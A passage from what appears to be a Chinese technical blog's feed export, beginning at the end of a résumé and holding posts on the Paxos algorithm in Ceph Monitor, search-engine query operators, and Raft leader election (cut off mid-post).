<li>HaDsk磁盘过滤驱动设计编码（windows版）</li>
</ol>
<hr>
<h2 id="2010-08-–-2012-04"><a href="#2010-08-–-2012-04" class="headerlink" title="2010&#x2F;08 – 2012&#x2F;04"></a>2010&#x2F;08 – 2012&#x2F;04</h2><h3 id="北京聚利科技有限公司"><a href="#北京聚利科技有限公司" class="headerlink" title="北京聚利科技有限公司"></a>北京聚利科技有限公司</h3><p>** 职位 ** : 高级软件工程师<br>** 工作描述 ** ：</p>
<ul>
<li>负责产品需求分析、架构设计、模块设计、编码工作</li>
</ul>
<h3 id="项目-3"><a href="#项目-3" class="headerlink" title="项目"></a>项目</h3><h4 id="北京出租车新地标车载信息系统——中控"><a href="#北京出租车新地标车载信息系统——中控" class="headerlink" title="北京出租车新地标车载信息系统——中控"></a>北京出租车新地标车载信息系统——中控</h4><p>** 项目介绍 ** :<br>为中控应用程序提供硬件支持</p>
<ol>
<li>SPI转发串口数据</li>
<li>GPRS连接网络</li>
<li>应用程序自启动</li>
<li>GPIO控制</li>
<li>自断电控制</li>
<li>RTC同步</li>
</ol>
<p>** 时间 ** : 2011&#x2F;08 – 2012&#x2F;04<br>** 系统 ** ：WinCE6.0<br>** 硬件 ** ：SirfA4（ARM）<br>** 工具 ** : PlatformBuilder6.0 , VS2005<br>** 责任描述 ** :</p>
<ol>
<li>需求分析</li>
<li>整体架构设计</li>
<li>SPI转发串口数据模块设计、编码及测试</li>
<li>应用程序自启动模块设计、编码及测试</li>
<li>GPIO控制模块设计、编码及测试</li>
<li>自断电控制模块设计、编码及测试</li>
<li>wince内核定制</li>
</ol>
<h4 id="北京出租车新地标车载信息系统——计价器-TXN-13"><a href="#北京出租车新地标车载信息系统——计价器-TXN-13" class="headerlink" title="北京出租车新地标车载信息系统——计价器(TXN-13)"></a>北京出租车新地标车载信息系统——计价器(TXN-13)</h4><p>** 项目介绍 ** :<br>为出租车司机提供计价、娱乐、电话、导航、召调车等服务</p>
<ol>
<li>计价功能</li>
<li>娱乐功能(音频文件和视频文件的播放)</li>
<li>实现中心调车、召车、打电话、导航、等辅助功能</li>
</ol>
<p>** 时间 ** : 2010&#x2F;08 – 2012&#x2F;04<br>** 系统 ** : wince6.0、windows xp<br>** 硬件 ** ：SirfA4 , x86<br>** 工具 ** : vs2005<br>** 责任描述 ** :</p>
<ol>
<li>需求分析</li>
<li>整体架构设计</li>
<li>计价模块设计、编码及测试</li>
<li>多媒体模块设计、编码及测试</li>
<li>出租车多功能业务模块设计、编码及测试</li>
</ol>
<hr>
<h2 id="2007-10-–-2010-04"><a href="#2007-10-–-2010-04" class="headerlink" title="2007&#x2F;10 – 2010&#x2F;04"></a>2007&#x2F;10 – 2010&#x2F;04</h2><h3 id="沈阳美行科技有限公司"><a href="#沈阳美行科技有限公司" class="headerlink" title="沈阳美行科技有限公司"></a>沈阳美行科技有限公司</h3><p>** 职位 ** : 软件工程师<br>** 工作描述 ** : </p>
<ul>
<li>负责模块设计，编码，测试等相关工作</li>
</ul>
<h3 id="项目-4"><a href="#项目-4" class="headerlink" title="项目"></a>项目</h3><h4 id="道道通导航系统"><a href="#道道通导航系统" class="headerlink" title="道道通导航系统"></a>道道通导航系统</h4><p>** 项目介绍 ** :<br>道道通导航系统，为客户提供，地图浏览、数据检索、卫星定位、路线引导、语音提示、路线计算、实时路况等服务</p>
<p>** 时间 ** : 2009&#x2F;05 – 2010&#x2F;03<br>** 系统 ** : Windows CE、windows xp<br>** 硬件 ** : MIPS、ARM、x86<br>** 工具 ** : vs2005<br>** 责任描述 ** :</p>
<ol>
<li>地图描画数据制作模块的设计、编码、测试</li>
<li>UI部分画页的设计、编码、测试</li>
<li>用户数据备份与恢复模块的设计、编码、测试</li>
</ol>
]]></content>
  </entry>
  <entry>
    <title>Paxos算法分析</title>
    <url>/2017/02/13/algorithm/analyse-paxos/</url>
    <content><![CDATA[<h1 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h1><p><img src="/images/paxos/analyse-paxos-byzantine.jpeg" alt="analyse-paxos-byzantine"></p>
<p>拜占庭位于如今的土耳其的伊斯坦布尔，是东罗马帝国的首都。由于当时拜占庭罗马帝国国土辽阔，为了防御目的，因此每个军队都分隔很远，将军与将军之间只能靠信差传消息。 在战争的时候，拜占庭军队内所有将军和副官必需达成一致的共识，决定是否有赢的机会才去攻打敌人的阵营。但是，在军队内有可能存有叛徒和敌军的间谍，左右将军们的决定又扰乱整体军队的秩序。在进行共识时，结果并不代表大多数人的意见。这时候，在已知有成员谋反的情况下，其余忠诚的将军在不受叛徒的影响下如何达成一致的协议，拜占庭问题就此形成。</p>
<p>拜占庭将军问题是一个协议问题，拜占庭帝国军队的将军们必须全体一致的决定是否攻击某一支敌军。问题是这些将军在地理上是分隔开来的，并且将军中存在叛徒。叛徒可以任意行动以达到以下目标：欺骗某些将军采取进攻行动；促成一个不是所有将军都同意的决定，如当将军们不希望进攻时促成进攻行动；或者迷惑某些将军，使他们无法做出决定。如果叛徒达到了这些目的之一，则任何攻击行动的结果都是注定要失败的，只有完全达成一致的努力才能获得胜利。</p>
<p>拜占庭假设是对现实世界的模型化，由于硬件错误、网络拥塞或断开以及遭到恶意攻击，计算机和网络可能出现不可预料的行为。拜占庭容错协议必须处理这些失效，并且这些协议还要满足所要解决的问题要求的规范。这些算法通常以其弹性t作为特征，t表示算法可以应付的错误进程数。</p>
<p>很多经典算法问题只有在<code>t&lt;n/3</code>时才有解，如拜占庭将军问题，其中n是系统中进程的总数。</p>
<p>为了解决拜占庭将军问题，图灵奖大神Leslie Lamport提出了Paxos算法，该算法可以帮助解决分布式系统中的一致性问题。</p>
<h1 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h1><p>在分布式系统中，为了保证数据的高可用，我们会将数据保留多个副本，这些副本会放置在不同的物理机上。为了对用户提供正确的读写，我们需要保证这些放置在不同物理机上的副本是一致的。</p>
<p>其中Proposer与Acceptor之间的交互主要有两个阶段、4类消息构成。</p>
<ul>
<li>Phase1<br>  本阶段由2类消息构成prepare和promise，Proposer向网络内超过半数的Acceptor发送prepare消息</li>
<li>Phase2<br>  prepare、promise、accept、accepted。</li>
</ul>
<h2 id="角色"><a href="#角色" class="headerlink" title="角色"></a>角色</h2><p>Paxos中有三类角色Proposer、Acceptor、Learner</p>
<p><img src="/images/paxos/analyse-paxos-members.png" alt="analyse-paxos-members"></p>
<h2 id="选举流程"><a href="#选举流程" class="headerlink" title="选举流程"></a>选举流程</h2><p>整个Paxos算法流程分为3个阶段</p>
<ul>
<li>准备阶段</li>
<li>决议阶段</li>
<li>学习阶段</li>
</ul>
<p><img src="/images/paxos/analyse-paxos-flow.png" alt="analyse-paxos-flow"></p>
<h3 id="准备阶段"><a href="#准备阶段" class="headerlink" title="准备阶段"></a>准备阶段</h3><ul>
<li>Proposer向大多数Acceptor发起自己要发起Proposal(epochNo, value)的Prepare请求</li>
<li>Acceptor收到Prepare请求，如果epochNo比已经接受的小的，直接拒绝; 如果epochNo比已经接受的大，保证不再接受比该epochNo小的请求，且将已经接受的epochNo最大的Proposal返回给Proposer</li>
</ul>
<h3 id="决议阶段"><a href="#决议阶段" class="headerlink" title="决议阶段"></a>决议阶段</h3><ul>
<li>Proposer收到大多数Acceptor的Prepare应答后，如果已经有被接受的Proposal，就从中选出epochNo最大的Proposal, 发起对该Proposal的Accept请求。如果没有已经接受的Proposal, 就自己提出一个Proposal, 发起Accept请求。</li>
<li>Acceptor收到Accept请求后，如果该Proposal的epochNo比它最后一次应答的Prepare请求的epochNo要小，那么要拒绝该请求；否则接受该请求。</li>
</ul>
<h3 id="学习阶段"><a href="#学习阶段" class="headerlink" title="学习阶段"></a>学习阶段</h3><ul>
<li>当各个Acceptor达到一致之后，需要将达到一致的结果通知给所有的Learner</li>
</ul>
<p><img src="/images/paxos/analyse-paxos-flow-detail.png" alt="analyse-paxos-flow-detail"></p>
<h3 id="Proposer角色"><a href="#Proposer角色" class="headerlink" title="Proposer角色"></a>Proposer角色</h3><p>(Phase1.a) 向所有的acceptors发送Prepare(i, b)请求；</p>
<p>(Phase2.a) 如果收到Reject(i，b)消息，那么重新发送Prepare(i，b+n)，n为一个整型值，不同的proposer具有不同的n值，使得proposer之间保持一个偏序关系，保证不同的proposer不会使用相同的b值，即提案编号；</p>
<p>(Phase2.a) 如果收到acceptors集合的任意一个majority的Promise(i, b, V, VB)回复，那么如果所有的V均为空，proposer可以自由选取一个v(value)，一般为用户提出的请求，回发Accept(i, b, v)；否则回发Accept(i，b，V)；</p>
<p>(Phase2.b) 如果收到Nack(b)，回到(Phase1.a)发送Prepare(i，b+n)；</p>
<p>(Phase2.b) 如果收到任意一个majority所有成员的Accepted(i，b，v)消息(表明投票已经完成)。这个过程learner也能收到Accepted消息，learner查看i是否为当前需要确认的iid，如果是则立即执行这个被批准的决议v；否则将该Accepted保存下来。</p>
<p>Phase2.b阶段完成后，各个角色上对应该实例的状态都将变为closed状态，即该实例已经选出决议，proposer不能再提出新的提案。这样保证一个实例只能选出一个决议。在实际应用过程中，为了简化实现，常常在proposers中选举出一个leader，来充当协调者。当leader选举出来后，系统中只能由leader向acceptors发出Prepare请求，也就是说这能由leader发起提案，而其它的proposers则只干一件事，即定时检测系统中的leader是否还在工作，如果在一定时间内收不到leader的心跳消息，则剩下的proposers发起新一轮leader竞选，选取新的leader。</p>
<h3 id="Acceptor"><a href="#Acceptor" class="headerlink" title="Acceptor"></a>Acceptor</h3><p>acceptor会维护一个状态记录表，表的每一行维护这样四个数据&lt;iid, B, V, VB&gt;, iid表示实例id。B是一个整数，用来表示同意或接受过的该提案的最高编号。V表示该提案对应的决议，里面保存着客户端发送过来的数据。VB表示已经接受过的提案的编号。</p>
<p>(Phase 1.b) 接收Prepare(i，b)消息，i为实例id号，b为提案编号。对于同一个i，如果<code>b&gt;B</code>，那么回复Promise(i, b, V, VB)，并设B&#x3D;b；否则，回复Reject(i，b)，其中b&#x3D;B。</p>
<p>(Phase 2.b) 接收Accept(i, b, v)，如果<code>b&lt;B</code>，那么回复Nack(b)信息，其中b&#x3D;B(暗示该proposer提出提案后至少有一个其它的proposer广播了具有更高编号的提案)；否则设置V&#x3D;v，VB&#x3D;b，并且回复Accepted(i，b，v)消息。</p>
<p>其中：Promise(i, b, V, VB)表示向proposer保证对于该实例不再接受编号不大于b的相同iid的提案；Accepted表示向learner和proposer发送该提案被通过的消息。</p>
<h3 id="Learner"><a href="#Learner" class="headerlink" title="Learner"></a>Learner</h3><p>learner的主要任务就是监听来自acceptors的消息，用以最终确认并学习决议(value)，即被批准的提案。当learner收到来自大多数(majority)acceptors的接受消息后，就可以确定该实例(instance)的value已经被最终无歧义的确认。这个时候便可以执行决议里的操作。决议序列在所有learner上顺序都是一致的，每一个提案的发起将会触发一次Paxos过程，每个这样的过程是一个Paxos的实例。而在实际应用中常使用单增的整数来标识每一个实例，即iid(instance id)。iid从1开始，而所有从1开始到当前iid的实例都必须是已经被确认过的，即这些决议都已经被执行过。比如：learner A已经确认了前10个实例，这时iid为11的决议还没有被通过，而iid为12和13的提案已经得到大多数acceptors的接受。此时就会产生一个决议序列缺口(gap)，在这种情况下，A不能跳过11直接确认12和13，而是去询问acceptors是否已经通过11的决议。只有当iid为11的决议被确认后，iid为12和13的决议才能被确认学习。</p>
<h2 id="活锁问题"><a href="#活锁问题" class="headerlink" title="活锁问题"></a>活锁问题</h2><p>Todo…</p>
<h1 id="应用"><a href="#应用" class="headerlink" title="应用"></a>应用</h1><p>Paxos在Ceph Monitor应用。Monitor要做的事情很明确了，就是管理、维护和发布集群的状态信息，但是为了避免单点故障或者性能热点问题，一般使用多个Monitor来做这一件事情，也就是管理层有多个成员。集群的正常运行，首先需要管理层达成一致，达成一致就需要有一个能拍板的monitor（leader），大家都听它的就行了。所以要达成一致核心问题就是在众多monitor中选出那个能拍板的monitor。Ceph解决这个问题的方法很简单，有点类似于领导人的选举，即有资格的monitor先形成一个quorum（委员会），然后委员会的成员在quorum这个范围内选出一个leader，集群状态信息的更新以及quorum成员的维护就有这个leader负责。Leader的选取规则也比较简单，每个monitor在初始化的时候都会根据它的IP地址被赋予一个rank值，当选举leader时，rank值最小的monitor胜出当选leader。当quorum成员发生变化时（增加或者减少），都会触发重新选举流程，再选出一个leader。</p>
<p>monitor的代码目录结构：<br><img src="/images/paxos/analyse-paxos-ceph-monitor-src.png" alt="analyse-paxos-ceph-monitor-src.png"></p>
<h2 id="架构设计"><a href="#架构设计" class="headerlink" title="架构设计"></a>架构设计</h2><p><img src="/images/paxos/analyse-paxos-ceph-monitor-frame.png" alt="paxos-ceph-monitor-frame.png"></p>
<ul>
<li>DBStore层<br>  数据的最终存储组件，以leveldb为例</li>
<li>Paxos层<br>  在集群上对上层提供一致的数据访问逻辑，在这一层看来所有的数据都是kv；上层的多中PaxosService将不同的组件的map数据序列化为单条value，公用同一个paxos实例</li>
<li>PaxosService层<br>  每个PaxosService代表集群的一种状态信息。对应的，Ceph Moinitor中包含分别负责OSD Map，Monitor Map, PG Map, CRUSH Map的几种PaxosService。PaxosService负责将自己对应的数据序列化为kv写入Paxos层。Ceph集群所有与Monitor的交互最终都是在调用对应的PaxosSevice功能</li>
</ul>
<h2 id="关键流程及结构"><a href="#关键流程及结构" class="headerlink" title="关键流程及结构"></a>关键流程及结构</h2><h3 id="初始化流程"><a href="#初始化流程" class="headerlink" title="初始化流程"></a>初始化流程</h3><p><img src="/images/paxos/analyse-paxos-ceph-monitor-init-flow.png" alt="analyse-paxos-ceph-monitor-init-flow.png"></p>
<ul>
<li>自下而上依次初始化上述的三大组成部分：DBStroe，Paxos，PaxoService</li>
<li>初始化Messager，并向其中注册命令执行回调函数。Messager是Ceph中的网络线程模块，Messager会在收到网络请求后，回调Moniotor在初始化阶段注册命令处理函数</li>
<li>Bootstrap过程在整个Monitor的生命周期中被反复调用</li>
</ul>
<h4 id="Boostrap"><a href="#Boostrap" class="headerlink" title="Boostrap"></a>Boostrap</h4><ol>
<li>执行Boostrap的Monitor节点会首先进入PROBING状态，并开始向所有monmap中其他节点发送Probing消息</li>
<li>收到Probing消息的节点执行Boostrap并回复Probing_ack，并给出自己的last_commit以及first_commit，其中first_commit指示当前机器的commit记录中最早的一条，其存在使得单个节点上可以仅保存最近的几条记录</li>
<li>收到Probing_ack的节点发现commit数据的差距早于对方first_commit，则主动发起全同步，并在之后重新Boostrap</li>
<li>收到超过半数的ack并不需要全同步时，则进入选主过程</li>
</ol>
<p><img src="/images/paxos/analyse-paxos-ceph-monitor-boostrap-1.png" alt="analyse-paxos-ceph-monitor-boostrap-1.png"></p>
<p>经过boostrap过程，保证可以与半数以上的节点通讯，并且节点间commit数据历史差距不大了。</p>
<h4 id="select-victory"><a href="#select-victory" class="headerlink" title="select &amp; victory"></a>select &amp; victory</h4><p><img src="/images/paxos/analyse-paxos-ceph-monitor-victory.png" alt="analyse-paxos-ceph-monitor-victory.png"></p>
<h5 id="select"><a href="#select" class="headerlink" title="select"></a>select</h5><ol>
<li>将election_epoch加1，向Monmap中的所有其他节点发送Propose消息</li>
<li>收到Propose消息的节点进入election状态并仅对有更新的election_epoch且rank值大于自己的消息答复Ack。这里的rank简单的由ip大小决定</li>
<li>发送Propose的节点统计收到的Ack数，超时时间内收到Monmap中大多数的ack后可进入victory过程，这些发送ack的节点形成quorum</li>
</ol>
<h5 id="victory"><a href="#victory" class="headerlink" title="victory"></a>victory</h5><ol>
<li>election_epoch加1，可以看出election_epoch的奇偶可以表示是否在选举轮次</li>
<li>向quorum中的所有节点发送VICTORY消息，并告知自己的epoch及quorum</li>
<li>当前节点完成Election，进入Leader状态</li>
<li>收到VICTORY消息的节点完成Election，进入Peon状态</li>
</ol>
<h4 id="recovery"><a href="#recovery" class="headerlink" title="recovery"></a>recovery</h4><p>经过了Boostrap、select、victory，能确定leader和peon角色，以及quorum成员。在recovery阶段将leader和quorum节点间的数据更新到一致。整个集群进入可用状态。</p>
<p><img src="/images/paxos/analyse-paxos-ceph-monitor-recovery.png" alt="analyse-paxos-ceph-monitor-recovery.png"></p>
<h3 id="一致性读写流程"><a href="#一致性读写流程" class="headerlink" title="一致性读写流程"></a>一致性读写流程</h3><p>经过了上面的初始化流程，整个集群进入到一个正常状态，可以用Paxos进行一致性读写了。其中读流程比较简单，lease内的所有quorum均可以提供读服务。而所有写都会转发给leader。</p>
<h4 id="一致性写流程"><a href="#一致性写流程" class="headerlink" title="一致性写流程"></a>一致性写流程</h4><ol>
<li>leader在本地记录要提交的value，并向quroum中的所有节点发送begin消息，其中携带了要提交的value, accept_pn及last_commit</li>
<li>peon收到begin消息，如果accept过更高的pn则忽略，否则将value写入db并返回accept消息。同时peon会将当前的lease过期掉，在下一次收到lease前不再提供服务</li>
<li>leader收到 全部 quorum的accept后进行commit。本地commit后向所有quorum节点发送commit消息</li>
<li>peon收到commit消息，本地commit数据</li>
<li>leader通过lease消息将整个集群带入到active状态</li>
</ol>
<p><img src="/images/paxos/analyse-paxos-ceph-monitor-rw.png" alt="analyse-paxos-ceph-monitor-rw.png"></p>
<h2 id="状态转换"><a href="#状态转换" class="headerlink" title="状态转换"></a>状态转换</h2><h3 id="初始化阶段状态转换"><a href="#初始化阶段状态转换" class="headerlink" title="初始化阶段状态转换"></a>初始化阶段状态转换</h3><p><img src="/images/paxos/analyse-paxos-ceph-monitor-status-1.png" alt="analyse-paxos-ceph-monitor-status-1.png"></p>
<ul>
<li>STATE_PROBING<br>  boostrap过程中节点间相互探测，发现数据差距</li>
<li>STATE_SYNCHRONIZING<br>  当数据差距较大无法通过后续机制补齐时，进行全同步</li>
<li>STATE_ELECTING<br>  Monitor在进行选主</li>
<li>STATE_LEADER<br>  当前Monitor成为leader</li>
<li>STATE_PEON<br>  非leader节点</li>
</ul>
<h3 id="一致性读写阶段状态转换"><a href="#一致性读写阶段状态转换" class="headerlink" title="一致性读写阶段状态转换"></a>一致性读写阶段状态转换</h3><p><img src="/images/paxos/analyse-paxos-ceph-monitor-status-2.png" alt="analyse-paxos-ceph-monitor-status-2.png"></p>
<ul>
<li>STATE_RECOVERING<br>  对应上述RECOVERING过程</li>
<li>STATE_ACTIVE<br>  leader可以读写或peon拥有lease</li>
<li>STATE_UPDATING<br>  向quroum发送begin，等待accept</li>
<li>STATE_WRITING<br>  收到accept</li>
<li>STATE_REFERSH<br>  本地提交并向quorum发送commit</li>
</ul>
<h1 id="参考-鸣谢"><a href="#参考-鸣谢" class="headerlink" title="参考&amp;鸣谢"></a>参考&amp;鸣谢</h1><ul>
<li><a href="http://www.cnblogs.com/ychellboy/archive/2010/01/01/1637265.html">分布式一致性Paxos算法学习笔记（三）：算法的工程化描述</a></li>
<li><a href="http://www.cnblogs.com/ychellboy/archive/2010/04/05/1704883.html">分布式一致性Paxos算法学习笔记（四）：算法回顾</a></li>
<li><a href="http://www.cppblog.com/kevinlynx/archive/2014/10/15/208580.html">图解分布式一致性协议Paxos</a></li>
<li><a href="http://www.tuicool.com/articles/eMnu2aA">我所理解的Paxos</a></li>
<li><a href="http://blog.csdn.net/scaleqiao/article/details/52231900">Ceph Monitor源码机制分析（一）—— 概述</a></li>
<li><a href="http://blog.csdn.net/scaleqiao/article/details/52242345">Ceph Monitor源码机制分析（二）—— 初始化</a></li>
<li><a href="http://blog.csdn.net/scaleqiao/article/details/52315468">Ceph Monitor源码机制分析（三）—— 选举</a></li>
<li><a href="http://www.tuicool.com/articles/R3M7JzM">Ceph Monitor实现</a></li>
</ul>
]]></content>
      <categories>
        <category>algorithm</category>
      </categories>
      <tags>
        <tag>ceph</tag>
        <tag>paxos</tag>
      </tags>
  </entry>
  <entry>
    <title>搜索引擎命令用法</title>
    <url>/2016/11/17/search-engine-command/</url>
    <content><![CDATA[<h1 id="搜索引擎"><a href="#搜索引擎" class="headerlink" title="搜索引擎"></a>搜索引擎</h1><p>搜索引擎对于每一个码农来说都是一个互联网数据库，在这个数据库中有很多信息，我们在这个数据库中检索数据不需要指定数据库，也不需要数据表，只需要指定你需要检索的关键字即可。但这种搜索方式虽然搜索范围大，无漏网之鱼，可也搜到了很多于我们需要无关的内容。为了精确查找，筛选掉不需要的信息。搜索引擎还有如下用法，接下来，就让我们一探究竟吧。</p>
<h1 id="特殊用法"><a href="#特殊用法" class="headerlink" title="特殊用法"></a>特殊用法</h1><p>由于天朝屏蔽Google，所以以下可在baidu搜索输入框中操作实现。</p>
<h2 id="指定标题搜索"><a href="#指定标题搜索" class="headerlink" title="指定标题搜索"></a>指定标题搜索</h2><h3 id="语法"><a href="#语法" class="headerlink" title="语法"></a>语法</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">intitle:&quot;&lt;网页title内容(标签上显示的内容)&gt;&quot;</span><br></pre></td></tr></table></figure>
<h3 id="举例"><a href="#举例" class="headerlink" title="举例"></a>举例</h3><p>搜索title中含有“Bolog”的网页</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">intitle:&quot;Bolog&quot;</span><br></pre></td></tr></table></figure>

<h2 id="指定URL搜索"><a href="#指定URL搜索" class="headerlink" title="指定URL搜索"></a>指定URL搜索</h2><h3 id="语法-1"><a href="#语法-1" class="headerlink" title="语法"></a>语法</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">inurl:&lt;全部或部分URL信息&gt;</span><br></pre></td></tr></table></figure>
<h3 id="举例-1"><a href="#举例-1" class="headerlink" title="举例"></a>举例</h3><p>搜索url中包含<code>nginx-1-11-6</code>的网页</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">inurl:nginx-1-11-6</span><br></pre></td></tr></table></figure>

<h2 id="指定正文内容搜索"><a href="#指定正文内容搜索" class="headerlink" title="指定正文内容搜索"></a>指定正文内容搜索</h2><h3 id="语法-2"><a href="#语法-2" class="headerlink" title="语法"></a>语法</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">intext:&quot;&lt;搜索关键字&gt;&quot;</span><br></pre></td></tr></table></figure>
<p>此方法也是搜索引擎默认使用方法（猜的）</p>
<h3 id="举例-2"><a href="#举例-2" class="headerlink" title="举例"></a>举例</h3><p>搜索正文内容含有“python” 和“golang”关键字的网页</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">intext:&quot;&lt;python golang&gt;&quot;</span><br></pre></td></tr></table></figure>

<h2 id="指定网站（站点）搜索"><a href="#指定网站（站点）搜索" class="headerlink" title="指定网站（站点）搜索"></a>指定网站（站点）搜索</h2><h3 id="语法-3"><a href="#语法-3" class="headerlink" title="语法"></a>语法</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">site:&lt;网站域名&gt; &lt;搜索关键字&gt;</span><br></pre></td></tr></table></figure>
<h3 id="举例-3"><a href="#举例-3" class="headerlink" title="举例"></a>举例</h3><p>在oschina上搜索python关键字</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">site:oschina.net python</span><br></pre></td></tr></table></figure>

<h2 id="指定文件类型搜索"><a href="#指定文件类型搜索" class="headerlink" title="指定文件类型搜索"></a>指定文件类型搜索</h2><h3 id="语法-4"><a href="#语法-4" class="headerlink" title="语法"></a>语法</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">filetype:&lt;文件类型&gt; &lt;搜索关键字&gt;</span><br></pre></td></tr></table></figure>
<h3 id="举例-4"><a href="#举例-4" class="headerlink" title="举例"></a>举例</h3><p>搜索所有带有python关键字的PDF文档</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">filetype:pdf python</span><br></pre></td></tr></table></figure>

<h1 id="参考-鸣谢"><a href="#参考-鸣谢" class="headerlink" title="参考&amp;鸣谢"></a>参考&amp;鸣谢</h1><ul>
<li><a href="http://www.360doc.com/content/13/1014/11/1956846_321333210.shtml">intile,inurl,filetype,site作用及在google中的用法</a></li>
</ul>
]]></content>
      <categories>
        <category>other</category>
      </categories>
      <tags>
        <tag>search</tag>
      </tags>
  </entry>
  <entry>
    <title>Raft</title>
    <url>/2020/11/08/algorithm/raft/</url>
    <content><![CDATA[<p>分布式系统在极大提高可用性、容错性的同时，带来了一致性问题（CAP理论）。Raft算法能够解决分布式系统环境下的一致性问题。一致性是分布式系统容错的基本问题。一致性涉及多个服务器状态（Values）达成一致。 一旦他们就状态做出决定，该决定就是最终决定。 当大多数服务器可用时，典型的一致性算法会取得进展。</p>
<p>raft是工程上使用较为广泛的强一致性、去中心化、高可用的分布式协议。在这里强调了是在工程上，因为在学术理论界，最耀眼的还是大名鼎鼎的Paxos。但Paxos是：少数真正理解的人觉得简单，尚未理解的人觉得很难，大多数人都是一知半解。本人也花了很多时间、看了很多材料也没有真正理解。直到看到raft的论文，两位研究者也提到，他们也花了很长的时间来理解Paxos，他们也觉得很难理解，于是研究出了raft算法。</p>
<h1 id="Leader选举"><a href="#Leader选举" class="headerlink" title="Leader选举"></a>Leader选举</h1><p>raft协议中，一个节点任一时刻处于<code>leader</code>, <code>follower</code>, <code>candidate</code>三个角色之一。</p>
<ul>
<li>leader 接受客户端请求，并向Follower同步请求日志，当日志同步到大多数节点上后告诉Follower提交日志。</li>
<li>follower 接受并持久化Leader同步的日志，在Leader告之日志可以提交之后，提交日志。</li>
<li>candidate Leader选举过程中的临时角色。</li>
</ul>
<p><img src="/images/raft/election_state.jpg" alt="election_state"></p>
<p>每个节点以<code>follower</code>角色开始，如果<code>follower</code>超时没有收到<code>leader</code>的消息，它会进入<code>candidate</code>角色，并发起选举投票。如果<code>candidate</code>收到的票数超过半数以上，则切换为<code>leader</code>角色。如果发现其他节点比自己更新，则主动切换到<code>follower</code>。总之，系统中最多只有一个<code>leader</code>，如果在一段时间里发现没有<code>leader</code>，则大家通过选举-投票选出<code>leader</code>。<code>leader</code>会不停的给<code>follower</code>发心跳消息，表明自己的存活状态。如果<code>leader</code>故障，那么<code>follower</code>会转换成<code>candidate</code>，重新选出<code>leader</code>。</p>
<p><img src="/images/raft/election_term.png" alt="election_term"></p>
<p>leader是大家投票选举出来的，每个leader工作一段时间，然后选出新的leader继续负责。这根民主社会的选举很像，每一届新的履职期称之为一届任期，在raft协议中，也是这样的，对应的术语叫term。term（任期）以选举（election）开始，然后就是一段或长或短的稳定工作期（normal Operation）。从上图可以看到，任期是递增的，这就充当了逻辑时钟的作用；另外，term 3展示了一种情况，就是说没有选举出leader就结束了，然后会发起新的选举。</p>
<h2 id="选举过程"><a href="#选举过程" class="headerlink" title="选举过程"></a>选举过程</h2><h3 id="正常情况下选举"><a href="#正常情况下选举" class="headerlink" title="正常情况下选举"></a>正常情况下选举</h3><p>5个节点一开始的状态都是<code>Follower</code>。<br><img src="/images/raft/election_flow_normal_1.png" alt="election_flow_normal_1"></p>
<p>在一个节点倒计时结束(Timeout) 后，这个节点的状态变成<code>Candidate</code>开始选举，它给其他几个节点发送选举请求(RequestVote)<br><img src="/images/raft/election_flow_normal_2.png" alt="election_flow_normal_2"></p>
<p>其他四个节点都返回成功，这个节点的状态由<code>Candidate</code>变成了<code>Leader</code>，并在每个一小段时间后，就给所有的<code>Follower</code>发送一个 Heartbeat 以保持所有节点的状态，<code>Follower</code>收到<code>Leader</code>的Heartbeat后重设Timeout。<br><img src="/images/raft/election_flow_normal_3.png" alt="election_flow_normal_3"></p>
<p>只要有超过一半的节点投支持票了，<code>Candidate</code>才会被选举为<code>Leader</code>，5个节点的情况下，3个节点 (包括<code>Candidate</code>本身) 投了支持就行。</p>
<h3 id="Leader-出故障情况下的选举"><a href="#Leader-出故障情况下的选举" class="headerlink" title="Leader 出故障情况下的选举"></a>Leader 出故障情况下的选举</h3><p><img src="/images/raft/election_flow_error_leader_1.png" alt="election_flow_error_leader_1"></p>
<p><code>leader</code>出故障挂掉了，其他四个<code>follower</code>将进行重新选主。<br><img src="/images/raft/election_flow_error_leader_2.png" alt="election_flow_error_leader_2"></p>
<p>4个节点的选主过程和5个节点的类似，在选出一个新的<code>leader</code>后，原来的<code>Leader</code>恢复了又重新加入了，这个时候怎么处理？在Raft里，第几轮选举是有记录的，重新加入的<code>Leader</code>是第一轮选举(Term 1)选出来的，而现在的<code>Leader</code>则是Term 2，所有原来的<code>Leader</code>会自觉降级为<code>Follower</code><br><img src="/images/raft/election_flow_error_leader_3.png" alt="election_flow_error_leader_3"><br><img src="/images/raft/election_flow_error_leader_4.png" alt="election_flow_error_leader_4"><br><img src="/images/raft/election_flow_error_leader_5.png" alt="election_flow_error_leader_5"><br><img src="/images/raft/election_flow_error_leader_6.png" alt="election_flow_error_leader_6"></p>
<h3 id="多个Candidate情况下的Leader选举"><a href="#多个Candidate情况下的Leader选举" class="headerlink" title="多个Candidate情况下的Leader选举"></a>多个Candidate情况下的Leader选举</h3><p><img src="/images/raft/election_flow_mult_cand_1.png" alt="election_flow_mult_cand_1"></p>
<p>有两个<code>Follower</code>同时Timeout，都变成了<code>Candidate</code>开始选举，分别给一个<code>Follower</code>发送了投票请求。<br><img src="/images/raft/election_flow_mult_cand_3.png" alt="election_flow_mult_cand_2"></p>
<p>两个<code>Follower</code>分别返回了ok，这时两个<code>Candidate</code>都只有2票，要3票才能被选成<code>Leader</code>。<br><img src="/images/raft/election_flow_mult_cand_3.png" alt="election_flow_mult_cand_3"></p>
<p>两个<code>Candidate</code>会分别给另外一个还没有给自己投票的<code>Follower</code>发送投票请求。<br><img src="/images/raft/election_flow_mult_cand_4.png" alt="election_flow_mult_cand_4"></p>
<p>但是因为<code>Follower</code>在这一轮选举中，都已经投完票了，所以都拒绝了他们的请求。所以在Term 2没有<code>Leader</code>被选出来。<br><img src="/images/raft/election_flow_mult_cand_5.png" alt="election_flow_mult_cand_5"></p>
